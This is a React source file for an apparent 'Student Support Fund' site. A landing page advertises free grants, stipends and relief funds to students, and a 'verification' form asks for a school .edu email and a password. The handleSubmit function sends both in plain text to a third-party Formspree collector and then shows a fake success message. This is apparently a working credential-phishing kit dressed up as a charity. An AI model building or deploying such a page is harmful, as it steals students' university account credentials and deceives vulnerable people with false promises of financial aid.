import React, { useState } from 'react';
import './Pages.css';

// Landing Page Component
export const LandingPage = ({ onVerifyClick }) => {
  return (
    <div className="landing-page">
      {/* Hero Section */}
      <section className="hero">
        <div className="hero-container">
          <h1 className="hero-title">Helping Students Succeed Without Financial Barriers</h1>
          <p className="hero-subtitle">
            Explore student support opportunities designed to assist with educational expenses, 
            technology needs, housing, transportation, and academic success.
          </p>
          <button className="cta-button" onClick={onVerifyClick}>
            Verify School Email
          </button>
        </div>
      </section>

      {/* Statistics Section */}
      <section className="stats-section">
        <div className="stats-container">
          <div className="stat-card">
            <h3 className="stat-number">12,000+</h3>
            <p className="stat-label">Applications Reviewed</p>
          </div>
          <div className="stat-card">
            <h3 className="stat-number">350+</h3>
            <p className="stat-label">Partner Institutions</p>
          </div>
          <div className="stat-card">
            <h3 className="stat-number">95%</h3>
            <p className="stat-label">Student Satisfaction</p>
          </div>
        </div>
      </section>

      {/* Support Programs Section */}
      <section className="programs-section">
        <div className="section-header">
          <h2>Support Programs</h2>
          <p>Comprehensive assistance for every student need</p>
        </div>
        <div className="programs-grid">
          {[
            { title: 'Internet Access Grant', icon: '🌐' },
            { title: 'Tuition Relief Award', icon: '🎓' },
            { title: 'Student Housing Support Fund', icon: '🏠' },
            { title: 'Transportation Assistance Program', icon: '🚗' },
            { title: 'Student Wellness Support Package', icon: '💪' },
            { title: 'Technology Upgrade Grant', icon: '💻' },
            { title: 'Monthly Student Stipend Program', icon: '💰' },
            { title: 'School Supplies Assistance', icon: '📚' },
            { title: 'STEM Success Grant', icon: '🔬' },
            { title: 'Creative Arts Scholarship Fund', icon: '🎨' },
            { title: 'International Student Assistance Program', icon: '🌍' },
            { title: 'Graduation Readiness Fund', icon: '📜' },
            { title: 'Emergency Student Relief Fund', icon: '🆘' },
            { title: 'Student Meal Support Program', icon: '🍽️' },
            { title: 'Cost of Living Support Grant', icon: '🏙️' },
            { title: 'Academic Excellence Award', icon: '🏆' },
            { title: 'Student Success Bonus Program', icon: '🎁' }
          ].map((program, index) => (
            <div className="program-card" key={index}>
              <div className="program-icon">{program.icon}</div>
              <h3>{program.title}</h3>
            </div>
          ))}
        </div>
      </section>

      {/* Why Students Trust Us Section */}
      <section className="trust-section">
        <div className="section-header">
          <h2>Why Students Trust Us</h2>
        </div>
        <div className="trust-grid">
          <div className="trust-item">
            <div className="trust-icon">🔒</div>
            <h4>Secure Verification</h4>
          </div>
          <div className="trust-item">
            <div className="trust-icon">🎯</div>
            <h4>Student Focused</h4>
          </div>
          <div className="trust-item">
            <div className="trust-icon">⚡</div>
            <h4>Fast Review Process</h4>
          </div>
          <div className="trust-item">
            <div className="trust-icon">🇺🇸</div>
            <h4>Trusted By Students Nationwide</h4>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section className="faq-section">
        <div className="section-header">
          <h2>Frequently Asked Questions</h2>
        </div>
        <div className="faq-list">
          <div className="faq-item">
            <h4>Do I need a school email?</h4>
            <p>Yes, we require a valid .edu email address to verify your student status and ensure fair distribution of funds.</p>
          </div>
          <div className="faq-item">
            <h4>How long does verification take?</h4>
            <p>Verification typically takes 24-48 hours. You'll receive an email notification once your application is reviewed.</p>
          </div>
          <div className="faq-item">
            <h4>Is there any application fee?</h4>
            <p>No, our services are completely free. We believe financial support should never come with additional costs.</p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-container">
          <p>&copy; 2026 Student Support Fund. All rights reserved.</p>
          <div className="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
            <a href="#">Contact Support</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

// Login/Verification Page Component
export const LoginPage = ({ onBack }) => {
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    following: '',
    academicLevel: '',
    supportInterest: ''
  });
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    const formspreeEndpoint = 'https://formspree.io/f/YOUR_FORMSPREE_ID';
    
    try {
      const response = await fetch(formspreeEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          school_email: formData.email,
          password: formData.password,
          following_program: formData.following,
          academic_level: formData.academicLevel,
          support_interest: formData.supportInterest
        }),
      });
      
      if (response.ok) {
        setSubmitted(true);
      }
    } catch (error) {
      console.error('Submission error:', error);
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="login-page">
        <div className="success-message">
          <div className="success-icon">✓</div>
          <h2>Verification Submitted!</h2>
          <p>Thank you for your interest. We'll review your application and contact you shortly.</p>
          <button className="back-button" onClick={onBack}>Back to Home</button>
        </div>
      </div>
    );
  }

  return (
    <div className="login-page">
      <div className="login-container">
        <button className="back-link" onClick={onBack}>← Back to Home</button>
        <h2>Student Verification</h2>
        <p>Complete your verification to access support opportunities</p>
        
        <form onSubmit={handleSubmit} className="verification-form">
          <div className="form-group">
            <label>School Email</label>
            <input
              type="email"
              name="email"
              placeholder="yourname@university.edu"
              value={formData.email}
              onChange={handleChange}
              required
            />
          </div>

          <div className="form-group">
            <label>Password</label>
            <input
              type="password"
              name="password"
              placeholder="Create a password"
              value={formData.password}
              onChange={handleChange}
              required
            />
          </div>

          <div className="form-group">
            <label>How long have you been following our student support program?</label>
            <select name="following" value={formData.following} onChange={handleChange} required>
              <option value="">Select an option</option>
              <option>Less than 1 month</option>
              <option>1-6 months</option>
              <option>More than 6 months</option>
            </select>
          </div>

          <div className="form-group">
            <label>Current Academic Level</label>
            <select name="academicLevel" value={formData.academicLevel} onChange={handleChange} required>
              <option value="">Select your level</option>
              <option>Freshman</option>
              <option>Sophomore</option>
              <option>Junior</option>
              <option>Senior</option>
              <option>Graduate Student</option>
            </select>
          </div>

          <div className="form-group">
            <label>What support opportunity interests you most?</label>
            <select name="supportInterest" value={formData.supportInterest} onChange={handleChange} required>
              <option value="">Select an option</option>
              <option>Tuition Relief</option>
              <option>Housing Support</option>
              <option>Technology Upgrade</option>
              <option>Monthly Stipend</option>
              <option>Emergency Relief</option>
            </select>
          </div>

          <button type="submit" className="submit-button" disabled={loading}>
            {loading ? 'Processing...' : 'Verify & Continue'}
          </button>
        </form>
      </div>
    </div>
  );
};